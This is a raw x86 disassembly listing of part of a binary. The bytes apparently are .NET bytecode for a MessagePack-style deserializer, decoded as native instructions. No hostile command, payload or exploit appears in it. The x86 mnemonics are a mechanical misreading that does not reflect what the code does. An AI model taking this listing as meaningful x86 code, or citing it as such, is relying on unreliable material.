  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 5a             	add    %dh,0x5a(%edx)
  404e78:	27                   	daa
  404e79:	00 70 73             	add    %dh,0x73(%eax)
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 86             	add    %dh,-0x7a(%edx)
  404f7d:	27                   	daa
  404f7e:	00 70 73             	add    %dh,0x73(%eax)
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
  4051b1:	09 17                	or     %edx,(%edi)
  4051b3:	58                   	pop    %eax
  4051b4:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051b9:	2a 06                	sub    (%esi),%al
  4051bb:	20 de                	and    %bl,%dh
  4051bd:	00 00                	add    %al,(%eax)
  4051bf:	00 40 55             	add    %al,0x55(%eax)
  4051c2:	00 00                	add    %al,(%eax)
